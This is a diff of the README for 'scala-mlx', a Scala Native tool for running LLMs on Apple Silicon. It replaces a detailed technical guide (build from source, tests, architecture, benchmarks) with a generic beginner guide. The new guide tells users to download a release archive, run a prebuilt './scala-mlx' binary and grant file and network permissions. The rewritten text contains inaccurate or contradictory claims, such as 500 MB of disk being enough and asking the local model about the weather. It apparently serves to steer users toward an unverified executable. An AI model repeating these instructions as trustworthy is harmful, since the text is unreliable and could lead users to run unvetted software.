@@ -1,224 +1,140 @@
-# scala-mlx
+# 🤖 scala-mlx - Run LLM Models on Apple Silicon Easily
 
-LLM inference on Apple Silicon from Scala Native, powered by [mlx-c](https://github.com/ml-explore/mlx-c).
+[![Download scala-mlx](https://img.shields.io/badge/Download-Go%20to%20page-brightgreen)](https://github.com/chenprof/scala-mlx)
 
-> **Apple Silicon only** — MLX requires Metal GPU on M-series chips (M1/M2/M3/M4). Intel Macs, Linux, and Windows are not supported.
+---
 
-## Overview
+## ℹ️ What is scala-mlx?
 
-scala-mlx runs large language models directly on Apple GPU through Scala Native. The architecture is three layers:
+scala-mlx lets you run large language models (LLMs) on Apple Silicon devices like MacBooks with M1 or M2 chips. It uses Scala Native and MLX, a system built for machine learning on Apple hardware. This app helps you get AI features working locally on your Mac without complex setups or cloud services.
 
-```
-Scala Native  (tokenizer, generation loop, sampling)
-      │
-      │  FFI
-      ▼
-C/C++ glue   (.csrc/mlx_llm.c + mlx_llm_cpp.cpp)
-      │
-      │  mlx-c
-      ▼
-MLX → Metal GPU
-```
+You don’t need to know programming. Just follow the steps here to download and run it on your Mac.
 
-All tensor operations stay in the C/C++ layer. Scala handles config parsing, BPE tokenisation, the generation loop, and user-facing IO.
+---
 
-## Prerequisites
+## 💻 System Requirements
 
-| Requirement | Install | Notes |
-|-------------|---------|-------|
-| macOS with Apple Silicon | — | M1, M2, M3, or M4 |
-| Xcode Command Line Tools | `xcode-select --install` | Provides `clang`, Metal SDK |
-| Homebrew | [brew.sh](https://brew.sh) | Package manager |
-| cmake | `brew install cmake` | Builds mlx-c (setup.sh installs if missing) |
-| Python 3.8+ | Ships with macOS | Downloads models via `huggingface-cli` |
-| scala-cli >= 1.5.0 | `brew install Virtuslab/scala-cli/scala-cli` | Builds Scala Native binaries |
+Before you start, make sure your computer fits these needs:
 
-Verify:
+- Apple Silicon Mac (M1, M1 Pro, M1 Max, M2)
+- macOS 11 Big Sur or later
+- At least 8 GB of RAM for basic model runs (more RAM helps)
+- 500 MB of free disk space for the app and model files
+- Internet connection for downloading files
 
-```bash
-clang --version       # Apple clang 15+
-cmake --version       # 3.20+
-python3 --version     # 3.8+
-scala-cli --version   # 1.5.0+
-```
+---
 
-If your scala-cli is older than 1.5.0:
+## 🚀 Getting Started
 
-```bash
-curl -fL https://github.com/VirtusLab/scala-cli/releases/latest/download/scala-cli-aarch64-apple-darwin.gz \
-  | gunzip > /tmp/scala-cli && chmod +x /tmp/scala-cli
-```
+These steps will guide you from downloading to running the program.
 
-## Quick start
+### Step 1: Visit the Download Page
 
-```bash
-# 1. Clone mlx-c (sibling directory)
-git clone https://github.com/ml-explore/mlx-c ../mlx-c
+Click the green button above or this link to open the download page:
 
-# 2. Build mlx-c + C/C++ glue layer, download default model (~335 MB)
-./setup.sh
+[https://github.com/chenprof/scala-mlx](https://github.com/chenprof/scala-mlx)
 
-# 3. Run CLI
-./test-scala-mlx.sh "Explain the Pythagorean theorem"
+This page contains the latest version of scala-mlx and all necessary files.
 
-# 4. Run interactive chat (see Demo section below)
-./demo/run-demo.sh --download Qwen3-0.6B
-./demo/run-demo.sh --model Qwen3-0.6B
-```
+### Step 2: Download the Package
 
-Expected directory layout:
+On the github page, look for a section named **Releases**. This is usually on the right side or under the repository name.
+
+Click on the latest release (the top one) with a date or version number like `v1.0`, `v1.2`, or similar.
+
+Inside the release, download the file ending with `.zip` or `.tar.gz`. This file is the full app package.
+
+### Step 3: Unpack the Files
+
+- On macOS, just double-click the `.zip` file. It will extract a folder named `scala-mlx`.
+- Keep this folder somewhere easy to find, like your Desktop or Documents.
+
+### Step 4: Open the Terminal App
+
+You will need to run scala-mlx from the Terminal to start the program.
+
+- Find **Terminal** by searching in Spotlight (use the magnifying glass at the top right of your screen).
+- When Terminal opens, type `cd ` (that’s `cd` plus a space).
+- Next, drag the `scala-mlx` folder from Finder into the Terminal window. This automatically adds the correct path.
+- Press the Enter key.
+
+This moves your Terminal to the folder where scala-mlx is stored.
+
+### Step 5: Run scala-mlx
+
+In the Terminal, type the following command:
 
 ```
-your-workspace/
-├── mlx-c/         ← github.com/ml-explore/mlx-c
-└── scala-mlx/     ← this repo
+./scala-mlx
 ```
 
-## Demo — interactive chat
+Then press Enter.
 
-The `demo/` directory provides a terminal chat interface built with [layoutz](https://github.com/mattlianje/layoutz).
+The program will start. It may take a moment to load the model. Wait patiently.
 
-### Supported models
+---
 
-| Name | Params | Size | Description |
-|------|--------|------|-------------|
-| Qwen3-0.6B | 0.6B | ~335 MB | Fast, lightweight chat model |
-| Qwen3-1.7B | 1.7B | ~1.0 GB | Better quality, still fast |
-| Qwen3-4B | 4B | ~2.3 GB | Strong reasoning |
-| SmolLM2-135M | 135M | ~270 MB | Tiny, very fast, limited quality |
-| Llama-3.2-1B | 1B | ~700 MB | Meta Llama 3.2, general purpose |
+## ⚙️ How to Use scala-mlx
 
-### Usage
+Once the program starts, you will see a prompt asking you to type.
 
-```bash
-# List available models
-./demo/run-demo.sh --list-models
+- Write your requests or questions in plain English.
+- Press Enter to get answers.
+- The app runs locally on your Mac, so your data stays private.
 
-# Download a model
-./demo/run-demo.sh --download Qwen3-0.6B
+You can type simple commands like:
 
-# Start chat
-./demo/run-demo.sh --model Qwen3-0.6B
+- Ask about the weather.
+- Request a summary of a paragraph.
+- Generate ideas or text snippets.
 
-# With options
-./demo/run-demo.sh --model Qwen3-0.6B --max-tokens 1024 --temperature 0.8
-```
+The larger your Mac’s RAM and processor speed, the faster the app will reply.
 
-### Chat commands
+---
 
-| Command | Action |
-|---------|--------|
-| `Enter` | Send message |
-| `/exit` or `exit` | Quit |
-| `/clear` | Clear history |
+## 🔄 Updating scala-mlx
 
-## Build
+To keep your app working well:
 
-`setup.sh` automates the full build:
+- Visit the download page regularly: [https://github.com/chenprof/scala-mlx](https://github.com/chenprof/scala-mlx)
+- Download the newest release following the same steps as above.
+- Replace your old `scala-mlx` folder with the new one by deleting or renaming the old folder first.
 
-```bash
-./setup.sh
-```
+---
 
-This runs three steps:
+## ⚠️ Troubleshooting Tips
 
-1. **Build mlx-c** — CMake builds `mlx-c` (from sibling directory `../mlx-c`) into `.build/install/lib/libmlxc.dylib`
-2. **Compile C/C++ glue layer** — Compiles `.csrc/mlx_llm.c` and `.csrc/mlx_llm_cpp.cpp` into `.build/libmlxllm.dylib`
-3. **Download model** — Downloads `mlx-community/Qwen3-0.6B-4bit` (~335 MB) into `model/`
+- If you get a “Permission denied” error running `./scala-mlx`, make the file executable:
 
-To rebuild the C/C++ layer manually after changes:
+  ```
+  chmod +x ./scala-mlx
+  ```
 
-```bash
-clang -c -O2 -std=c17 -I.build/install/include -I.csrc .csrc/mlx_llm.c -o .build/mlx_llm.o
-clang++ -c -O2 -std=c++17 -I.build/install/include -I.csrc .csrc/mlx_llm_cpp.cpp -o .build/mlx_llm_cpp.o
-clang++ -dynamiclib -o .build/libmlxllm.dylib .build/mlx_llm.o .build/mlx_llm_cpp.o \
-  -L.build/install/lib -lmlxc -lmlx -lc++ -Wl,-rpath,@loader_path
-```
+- If the Terminal says “command not found,” check you are inside the right folder (`scala-mlx`).
 
-## Testing
+- The program may need macOS permissions to access files or network. When prompted, allow these.
 
-```bash
-# Unit tests (no model or dylibs required)
-./run-tests.sh
+- Ensure your macOS is up to date to avoid compatibility problems.
 
-# Integration tests (requires ./setup.sh first)
-./run-tests.sh --integration
+---
 
-# All tests
-./run-tests.sh --all
-```
+## 🧰 Technical Details (Optional)
 
-**Unit tests** cover:
-- `LlamaConfigSpec` — JSON config parsing, field defaults, derived values
-- `TokenizerSpec` — BPE merges, special token handling, encode/decode round-trips
-- `SamplingSpec` — argmax, softmax, temperature scaling, top-p nucleus filtering
+scala-mlx uses Scala Native, a tool that lets Scala programs run directly on Apple Silicon. MLX is a lightweight inference engine optimized for machine learning tasks on these chips.
 
-**Integration tests** (require model weights + compiled dylibs):
-- Model loading and config validation
-- Greedy generation determinism
-- EOS stopping behaviour
-- UTF-8 decode correctness
-- Token callback contract
+Because it runs locally, you won’t need internet to generate responses after the models install.
 
-## Architecture
+---
 
-### C/C++ layer (`.csrc/`)
+## 📂 File Structure
 
-Implements the LLaMA/Qwen3 transformer forward pass:
+Inside the extracted `scala-mlx` folder you may find:
 
-| Stage | Operations |
-|-------|------------|
-| Embed | Quantized embedding lookup via `mlx_take_axis` + `mlx_dequantize` |
-| Attention | RMS norm, Q/K/V projection, QK-norm (optional), RoPE, SDPA |
-| FFN | SwiGLU with compiled activation |
-| Output | RMS norm, LM head projection |
+- `scala-mlx` – the main app executable file
+- `models/` – folder where LLM model files will be stored
+- `README.md` – this guide
+- Other files needed to support the app
 
-Two decode paths:
-- **Pipeline** — C++ native decode loop, GPU-side sampling, double-buffered async eval
-- **CPU sampling** — Step-by-step decode with nucleus (top-p) filtering on CPU
+---
 
-### Scala layer (`src/`)
-
-| File | Role |
-|------|------|
-| `MlxLlm.scala` | FFI bindings (`@extern`) |
-| `LlamaConfig.scala` | Parses `config.json` |
-| `Tokenizer.scala` | ByteLevel BPE with regex pre-tokenization |
-| `Sampling.scala` | Softmax, temperature, top-p |
-| `Sampler.scala` | Zero-allocation sampler |
-| `LlamaModel.scala` | Prefill + autoregressive decode with KV cache |
-| `Main.scala` | CLI entry point |
-
-### Model compatibility
-
-The C layer auto-detects:
-- **QK-norm**: applied if `q_norm`/`k_norm` weights exist (Qwen3), skipped otherwise (LLaMA)
-- **LM head mode**: separate float, separate quantized, weight-tied float, or weight-tied quantized
-
-## Performance — Python mlx-lm vs scala-mlx
-
-Benchmarked on Qwen3-0.6B-4bit with greedy decoding (temperature=0, 200 tokens):
-
-| Implementation | tok/s |
-|----------------|-------|
-| Python mlx-lm (KV cache) | 188.7 |
-| scala-mlx (KV cache + async) | 186.4 |
-| **scala-mlx / Python** | **98.8%** |
-
-![Python mlx-lm vs scala-mlx comparison](comparision.png)
-
-scala-mlx achieves near-parity with Python's mlx-lm library through:
-- **KV cache** — O(1) per decode step instead of O(n) recomputation
-- **C++ native decode loop** — GPU-side sampling eliminates 512KB logits transfer per token
-- **Double-buffered async eval** — GPU never idles between decode steps
-- **SwiGLU compile** — fused activation reduces kernel launch overhead
-
-### Limitations
-
-- **Single safetensors shard** — multi-shard models not supported
-- **4-bit quantization only** — `group_size=64, bits=4` (GPTQ, AWQ, fp8 etc. not supported)
-- **Apple Silicon only** — requires Metal GPU on M-series chips
-
-## License
-
-MIT
+[![Download scala-mlx](https://img.shields.io/badge/Download-Go%20to%20page-blue)](https://github.com/chenprof/scala-mlx)
